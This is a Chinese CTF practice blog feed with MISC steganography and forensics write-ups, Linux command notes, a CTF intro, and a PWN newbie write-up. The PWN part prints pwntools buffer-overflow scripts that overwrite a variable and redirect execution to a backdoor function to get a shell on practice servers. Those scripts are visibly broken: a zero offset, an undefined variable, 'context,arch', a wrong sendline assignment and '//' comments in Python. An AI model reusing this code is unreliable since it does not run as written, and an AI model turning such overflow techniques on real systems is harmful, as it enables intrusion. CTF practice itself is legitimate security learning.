title="小明的保险箱"></a>小明的保险箱</h3><p>,,,跟上一个题不能说完全相似也只能说一模一样了，密码放在下面，溜了</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129164902137.png" alt="image-20211129164902137"></p><h3 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h3><p>拿到题后，习惯性看一下属性，发现有一点值得注意的地方</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129165526695.png" alt="image-20211129165526695" style="zoom:50%;"><p>暂且放下，之后010看一看，binwalk看一看，出来个压缩包，唉唉，没密码怎么办？？？</p><p>抱着试一试的想法，填上备注的信息，有惊喜哦，哎嘿。</p><h3 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h3><p>emmm…全都是TCP流有啥意思，我一个基本不会使wireshark的萌新直接追踪一下流flag就出来了、、、</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129181440188.png" alt="image-20211129181440188"></p><h3 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h3><p>呐呐呐，属性、010，wait！010真的找出了东西哎！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129170005565.png" alt="image-20211129170005565"></p><p>依据提示，base64转码即可</p><h3 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h3><p>属性，010，这次，我们又在010里找到了不寻常的地方</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129172208458.png" alt="image-20211129172208458"></p><p>一串2进制编码！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129172358141.png" alt="image-20211129172358141"></p><p>解码即可。</p><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129175426237.png" alt="image-20211129175426237"></p><p>在属性、010、binwalk无果后，我们来试试stegsolve，盲猜lsb（我只知道这个🐕）</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129175853648.png" alt="image-20211129175853648"></p><p>左面似乎啥也没有，但我们在右面发现了重头戏！504B0304，不是压缩包的文件头吗！！！果断将其保存为哦压缩文件，暂且无视bandizip的损坏提醒，解压下来堪堪——这是啥？？？！！！</p><p>一头雾水的我选择使用file命令辨别其文件类型</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129180422750.png" alt="image-20211129180422750"></p><p>elf文件，这真的是道misc，不是pwn？？？</p><p>ida打开，堪堪main函数，神奇的事情出现了！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129180541272.png" alt="image-20211129180541272"></p><p>ok，解决了</p><h3 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h3><p>ctfer当真啥都要会啊。。。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/pic.jpg" alt="pic"></p><p>别问，问就是盲文</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/202009091617300.png" alt="202009091617300"></p><p>解出来是“kmdonowg”，很明显是解压码，解压音频，拖入audacity，观察波形图</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129175146065.png" alt="image-20211129175146065"></p><p>别问，问就是摩斯电码（一边对着一边打，眼要瞎了）</p><blockquote><p>-.-.  -  ..-.  .–  .–.  .  ..  —–  —..  –…  …–  ..—  ..–..  ..—  …–  -..  –..</p></blockquote><p>线上解码即可</p><h3 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h3><p>依照题目所给信息爆破</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/%E7%A5%9E%E7%A7%98%E9%BE%99%E5%8D%B7%E9%A3%8E.png" alt="神秘龙卷风" style="zoom:50%;"><p>打开压缩包文本，发现神秘龙卷风</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130083144863.png" alt="image-20211130083144863" style="zoom: 33%;"><p>很明显是brainfuck，在线解码即可</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130083228685.png" alt="image-20211130083228685" style="zoom:67%;"><h3 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h3><p>后门查杀，就查杀后门呗😓</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202181414306.png" alt="image-20211202181414306"></p><p>题目已经提醒了密码即为flag，搜索pass，即可找到</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202181722647.png" alt="image-20211202181722647"></p><h3 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h3><p>题目要交流内容，交流内容大概率是文本，因此我们把目标放在http协议上，过滤后，得到了以下四个。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202180930267.png" alt="image-20211202180930267"></p><p>emmm，接下来我是一个个看的😂，最后在返回页面的那个流里发现了不同的东西—好长一段编码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202181046389.png" alt="image-20211202181046389"></p><p>bae64解码，flag出现</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202181203879.png" alt="image-20211202181203879"></p><h3 id="荷兰带宽数据泄露"><a href="#荷兰带宽数据泄露" class="headerlink" title="荷兰带宽数据泄露"></a>荷兰带宽数据泄露</h3><p>下载附件之后得到.bin文件，起初并不知道该怎么看，经过查找资料、例题之后，发现这是一个路由器信息恢复类问题，答案可能是username或者password，ctrl+F，果然是username。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202174931265.png" alt="image-20211202174931265"></p><h3 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h3><p>音频隐写，拖进audacity，</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130083902936.png" alt="image-20211130083902936"></p><p>明显的摩斯</p><blockquote><p>… -… -.-. —-. …— … -… …- —-. -.-. -… —– .—- —… —… …-. … …— . -… .—- –… -… –… —– —-. …— —-. .—- —-. .—- -.-.</p></blockquote><p>在线转码即可出flag</p><h3 id="Webshell后门"><a href="#Webshell后门" class="headerlink" title="Webshell后门"></a>Webshell后门</h3><p>emmm，这题和上面的某个题不能说一模一样，也只能说基本类似了，是哪个题我不说🤐</p><h3 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h3><p>属性里有ps，打开之后无果，010没有思路，最后使用binwalk，发现了压缩包！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130084916891.png" alt="image-20211130084916891" style="zoom:50%;"><p>但当我们兴高采烈的准备爆破时</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130085128897.png" alt="image-20211130085128897"></p><p>为什么呢？—— 联系前面做题的经验，我们猜测是伪加密</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130092850611.png" alt="image-20211130092850611"></p><p>果然是，我们将其更改，如上图</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130093034197.png" alt="image-20211130093034197" style="zoom:50%;"><p>在试过多种方法后，我仍然一头雾水，最终在wp的帮助下解决此题（惭愧）</p><p>原来是把文件当压缩文件！</p><h4 id="新知识"><a href="#新知识" class="headerlink" title=" 新知识"></a><font color="red" size="5"> <strong>新知识</strong></font></h4><p><img src="https://www.icode9.com/i/ll/?i=2020112809574741.png?,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTQ2Mzg1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>可以发现，文件就在其中一个压缩包里，密码爆破没给提示，只能从图片入手了，但是，属性、010、binwalk在图片里都没发现有用的东西，最终还是借助wp才做出这道题</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130225316574.png" alt="image-20211130225316574"></p><p>提取出了多个文件夹，其中两个明显提示有flag</p><p>one</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130225443219.png" alt="image-20211130225443219"></p><p>two</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130225509800.png" alt="image-20211130225509800"></p><p>解码即可</p><h3 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h3><p>下载好图片后，属性没提示，但在010里搜flag发现了一些东西</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130130305519.png" alt="image-20211130130305519"></p><p>估计flag就在这个文档里，走，上binwalk！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130130511145.png" alt="image-20211130130511145" style="zoom:50%;"><p>里面果然还有东西，把他们都提取出来</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130130838874.png" alt="image-20211130130838874"></p><h4 id="新知识-1"><a href="#新知识-1" class="headerlink" title="新知识 "></a><font color="red" size="5"><strong>新知识</strong> </font></h4><p>steghide的使用</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/20191006095037382.png" alt="img"></p><p>使用后，我们发现，出现了“ko.txt”这个文件，而它正是压缩包的密码，解压后，打开文档，本题结束。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130131701943.png" alt="image-20211130131701943" style="zoom:50%;"><h3 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h3><p>wireshark查看，从题目中“MD5”和“哈希”一下，我们可以推测我们要找的大概率是文本，因此我们优先追踪http流，果然不出所料。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207002614033.png" alt="image-20211207002614033"></p><p>嗯，然后随波逐流哈希一下，嗯</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207002552573.png" alt="image-20211207002552573"></p><p>此即为flagヾ(≧▽≦*)o</p><h3 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h3><p>提到键盘上的刷新，自然想到F5键，由此我们确定了本题的隐写方式——F5隐写</p><h4 id="F555"><a href="#F555" class="headerlink" title="F555"></a><font color="red"><strong>F555</strong></font></h4><blockquote><p>java Extract “待提取的图片路径”</p></blockquote><p>即会提取出其中文件，如下：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211206235445647.png" alt="image-20211206235445647"></p><p>我们查看解出的文件，发现一堆乱码，便怀疑不是文本文件，于是用file一看，果然不是</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207000820364.png" alt="image-20211207000820364"></p><p>拖到win里更改后缀，发现解压需要解压码，于是去爆破</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207002648795.png" alt="image-20211207002648795"></p><p>为什么没有文件？—— 依照前面的经验，怀疑是伪加密</p><p>果然是</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207003202319.png" alt="image-20211207003202319"></p><p>解出来了！！！睡觉！！！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="MISC" scheme="https://0410wzn.top/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界PWN新手区WP（长期更新）</title>
    <link href="https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2021-11-17T11:02:54.000Z</published>
    <updated>2021-11-19T03:12:00.167Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="攻防世界PWN新手区WP（长期更新）"><a href="#攻防世界PWN新手区WP（长期更新）" class="headerlink" title="攻防世界PWN新手区WP（长期更新）"></a>攻防世界PWN新手区WP（长期更新）</h1><blockquote><p>题目地址：<a href="https://adworld.xctf.org.cn/task/task_list?type=pwn&amp;number=2&amp;grade=0">https://adworld.xctf.org.cn/task/task_list?type=pwn&amp;number=2&amp;grade=0</a></p></blockquote><h2 id="一、get-shell"><a href="#一、get-shell" class="headerlink" title="一、get_shell"></a>一、get_shell</h2><p>  获取靶场,nc登上查看即可，</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117192610443.png" alt="image-20211117192610443" style="zoom:33%;"><h2 id="二、Hello-pwn"><a href="#二、Hello-pwn" class="headerlink" title="二、Hello pwn!"></a>二、Hello pwn!</h2><p>  首先拖进ksli里，用checksec看看文件多少位，以及保护措施的开关。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117193524850.png" alt="image-20211117193524850" style="zoom: 75%;"><p>  嗯，只开了NX，好耶！</p><p>  接下来用64位的ida打开分析逻辑，如下图</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117194019299.png" alt="image-20211117194019299" style="zoom:50%;"><p>  看准“&amp;”，重拳出击。很明显，本题要求我们输入数据到unk_601068的位置上，并在dword_60106C等于1853186401时，输出flag。</p><p>  明白运行逻辑，我们就明白了，我们需要向其中填入垃圾数据时其溢出到dword_60106C，这样程序就可以运行函数拿到flag，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;地址&#x27;</span>， 端口)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * ( <span class="number">0x60106C</span> - <span class="number">0x60106C</span> ) + p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;bof\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>  运行，皆大欢喜。</p><p>  <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211117195744632.png" alt="image-20211117195744632"></p><h2 id="三、level0"><a href="#三、level0" class="headerlink" title="三、level0"></a>三、level0</h2><p>  先用checksec看一下文件位数和保护措施，如下图</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/level0_01.png" alt="level0_01" style="zoom:75%;"><p>  依旧是只有NX开了，题目应该比较简单</p><p>  将文件拖入ida，先分析与运行逻辑，再shift + f12, 查看有没有后门函数，</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211119104858061.png" alt="image-20211119104858061" style="zoom: 90%;"> <p>  发现上图输入出存在栈溢出可能（buf为80字节，要输入200字节），然后去找后门函数</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211119105037317.png" alt="image-20211119105037317" style="zoom:75%;"><p>  发现有“/bin/sh”，同时有system，点进去发现后门在名为“callsystem”的函数里，因此我们的目标很明确了，同通过栈溢出将buf覆盖，并将epb转移到函数上，使程序运行后门函数，编写脚本即可，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context,arch = <span class="string">&quot;amd64&quot;</span>// 切换环境</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;地址&#x27;</span>, 端口)</span><br><span class="line"></span><br><span class="line">callsystem = <span class="number">0x400596</span>// 函数在栈中的位置</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * ( <span class="number">0x80</span> + <span class="number">0x08</span> ) + p64( callsystem )// 使程序最终运行后门函数</span><br><span class="line"></span><br><span class="line">io = sendline( payload )</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>  运行脚本，结果如下，成功控制服务器，寻找、查看flag即可。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/background/image-20211119110053521.png" alt="image-20211119110053521" style="zoom:50%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="人生苦短，我学Pwn" scheme="https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6Pwn/"/>
    
  </entry>
  
  <entry>
    <title>linux学习札记</title>
    <link href="https://0410wzn.top/2021/10/20/linux%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    <id>https://0410wzn.top/2021/10/20/linux%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/</id>
    <published>2021-10-20T15:35:51.000Z</published>
    <updated>2021-10-23T16:17:49.911Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>  本学习札记立足于笔者入门linux系统命令学习时，通过OverTheWise的战争游戏，经查询、做题实践后写出，不足之处还请多多见谅。</p><h4 id="1、pwd"><a href="#1、pwd" class="headerlink" title="1、pwd"></a>1、pwd</h4><p>  pwd命令常用于得知操作者目前所在的目录名称。</p><h4 id="2、ls"><a href="#2、ls" class="headerlink" title="2、ls"></a>2、ls</h4><p>  ls命令用于显示目前操作者所在目录之下的内容</p><blockquote><ul><li>-a 显示所有文件及目录 (<font size="3" color="red"><strong>.</strong> 开头的隐藏文件也会列出</font>)</li><li>-l 除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出</li><li>-r 将文件以相反次序显示(原定依英文字母次序)</li><li>-t 将文件依建立时间之先后次序列出</li><li>-A 同 -a ，但不列出 “.” (目前目录) 及 “..” (父目录)</li><li>-F 在列出的文件名称后加一符号；例如可执行档则加 “*”, 目录则加 “/“</li><li>-R 若目录下有文件，则以下之文件亦皆依序列出</li></ul></blockquote><h4 id="3、-cat"><a href="#3、-cat" class="headerlink" title="3、 cat"></a>3、 cat</h4><p>  cat命令用于连接文件并打印到标准输出设备上</p><blockquote><ul><li><p>-n 或 –number**：由 1 开始对所有输出的行数编号。</p></li><li><p>-b 或 –number-nonblank**：和 -n 相似，只不过对于空白行不编号</p></li><li><p>-s 或 –squeeze-blank**：当遇到有连续两行以上的空白行，就代换为一行的空白行</p></li><li><p>-v 或 –show-nonprinting**：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外</p></li><li><p>-E 或 –show-ends : 在每行结束处显示 $</p></li><li><p>-T 或 –show-tabs: 将 TAB 字符显示为 ^I</p></li><li><p>-A, –show-all：等价于 -vET</p></li><li><p>-e：**等价于”-vE”选项</p></li><li><p>-t：**等价于”-vT”选项</p></li></ul></blockquote><p>例：<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/07.png" style="zoom:67%;"></p><h4 id="4、-file"><a href="#4、-file" class="headerlink" title="4、 file"></a>4、 file</h4><p>  file命令通常用来查看辨别文件命名，与呆板的windows不同，linux不是通过文件后缀名去判断文件为何，而是通过判断文件的<font size="3" color="red">文件头</font>来判断的，因此linux可以准确地判断文件为何种类型。</p><blockquote><ul><li>-b 　列出辨识结果时，不显示文件名称</li><li>-c 　详细显示指令执行过程，便于排错或分析程序执行的情形</li><li>-f      &lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称</li><li>-L 　直接显示符号连接所指向的文件的类别</li><li>-m    &lt;魔法数字文件&gt; 　指定魔法数字文件</li><li>-v 　显示版本信息</li><li>-z 　尝试去解读压缩文件的内容</li><li>[文件或目录…]     要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件</li></ul></blockquote><p>  例：<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/12.png" style="zoom:67%;"></p><h4 id="5、-find"><a href="#5、-find" class="headerlink" title="5、 find"></a>5、 find</h4><p>  find一般用来查找指定目录下的文件，<font size="3" color="red">如果未加参数，则会将查到的子目录与文件全部显示</font>。</p><blockquote><p>由于参数过多，下面只列出较为常用的部分：</p><ul><li><p>-mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件</p></li><li><p>-amin n : 在过去 n 分钟内被读取过</p></li><li><p>-anewer file : 比文件 file 更晚被读取过的文件</p></li><li><p>-atime n : 在过去n天内被读取过的文件</p></li><li><p>-cmin n : 在过去 n 分钟内被修改过</p></li><li><p>-cnewer file :比文件 file 更新的文件</p></li><li><p>-ctime n : 在过去n天内被修改过的文件</p></li><li><p>-empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name</p></li><li><p>-ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写</p></li><li><p>-name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写</p></li><li><p>-size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。</p></li><li><p>-type c : 文件类型是 c 的文件。</p></li><li><p>d: 目录</p></li><li><p>c: 字型装置文件</p></li><li><p>b: 区块装置文件</p></li><li><p>p: 具名贮列</p></li><li><p>f: 一般文件</p></li><li><p>l: 符号连结</p></li><li><p>s: socket</p></li><li><p>-pid n : process id 是 n 的文件</p></li></ul></blockquote><p>  例：（这里与下一命令size一起列出）<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/hexobackground/16.png" style="zoom: 67%;"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Linux命令入门" scheme="https://0410wzn.top/tags/Linux%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界MISC新手题部分WP(更新ing)</title>
    <link href="https://0410wzn.top/2021/10/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E9%A2%98%E9%83%A8%E5%88%86WP-%E6%9B%B4%E6%96%B0ing/"/>
    <id>https://0410wzn.top/2021/10/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E9%A2%98%E9%83%A8%E5%88%86WP-%E6%9B%B4%E6%96%B0ing/</id>
    <published>2021-10-10T00:34:06.000Z</published>
    <updated>2021-10-29T08:51:16.920Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="攻防世界Misc新手题WP"><a href="#攻防世界Misc新手题WP" class="headerlink" title="攻防世界Misc新手题WP"></a>攻防世界Misc新手题WP</h1><blockquote><p>地址：<a href="https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0">https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0</a></p></blockquote><h2 id="一、PDF"><a href="#一、PDF" class="headerlink" title="一、PDF"></a>一、PDF</h2><blockquote><p>菜猫给了菜狗一张图，说图下面什么都没有</p></blockquote><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/01.jpg" alt="01" style="zoom: 25%;"><p>  因为题目里明显提示了“下面”，我们自然便能想到文件“下面”藏着什么，其一可能在图片下面藏有信息，其二可能藏有其它文件，于是开始逐步尝试。</p><p>  首先，我们查看其属性，发现并没有什么隐藏信息，于是开始研究图片下面。</p><p>  通过办公软件，我们将pdf文件转换成word文档，以此来从物理上观察图片下的信息。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/02.jpg" alt="02.jpg" style="zoom: 50%;"><p>   当我们打开word文档，我们惊奇的发现，flag已经明显出现在眼前了！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/03.jpg" alt="03.jpg" style="zoom:25%;"><p>  复制粘贴结束。</p><h2 id="二、give-you-flag"><a href="#二、give-you-flag" class="headerlink" title="二、give_you_flag"></a>二、give_you_flag</h2><blockquote><p>菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包</p></blockquote><p>  下载附件后，看到如下动图。</p><p>​                                                            <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/4b0799f9a4d649f09a882b6b1130bb70%20(1).gif">  </p><p>  题目中提到“文件中的”彩蛋“，所以文件中肯定有一些信息，而一张动图，是由多张静止图片组合成的，由  此想到，运用stegsolve一帧一帧的看，发现一面的一帧藏有信息—一张二维码！！！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/image-20211012164312725.png"></p><p>  我们使用分帧工具将图片提取出来，得到带有二维码的图片</p><p>​                                                                   <img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/IMG00049.bmp"></p><p>  很明显，这个二维码缺少定位角，找到定位角用图片编辑工具补上即可。补完后，扫码，flag出现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="入门" scheme="https://0410wzn.top/tags/%E5%85%A5%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTF简介</title>
    <link href="https://0410wzn.top/2021/10/09/CTF%E7%AE%80%E4%BB%8B/"/>
    <id>https://0410wzn.top/2021/10/09/CTF%E7%AE%80%E4%BB%8B/</id>
    <published>2021-10-09T13:57:31.000Z</published>
    <updated>2021-10-29T08:50:20.255Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、CTF简介"><a href="#一、CTF简介" class="headerlink" title="一、CTF简介"></a>一、CTF简介</h1><p>  Capture The Flag（以下简称”CTF”）,顾名思义，即是夺取旗帜，由于相关介绍已经比较完全完全，其简介可见百度知道:<a href="https://baike.baidu.com/item/CTF/9548546?fr=aladdin">CTF</a>词条。</p><p><a href="E:\photo\CTF">CTF</a></p><h1 id="二、CTF的题目类型"><a href="#二、CTF的题目类型" class="headerlink" title="二、CTF的题目类型"></a>二、CTF的题目类型</h1><p>​    CTF的题目类型大致包括以下五种： <a href="#Web">Web</a>，<a href="#Pwn">Pwn</a>，<a href="#Misc">Misc</a>， <a href="#Reverse">Reverse</a>，<a href="#Crypto">Crypto</a></p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>​    Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如<code>SQL注入</code>、<code>XSS</code>、<code>代码执行</code>、<code>代码审计</code>等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件.</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>​    Pwn类题目重点考察选手对于<code>二进制漏洞的挖掘和利用</code>能力，其考点也通常在<code>堆栈溢出</code>、<code>格式化漏洞</code>、<code>UAF</code>、<code>Double 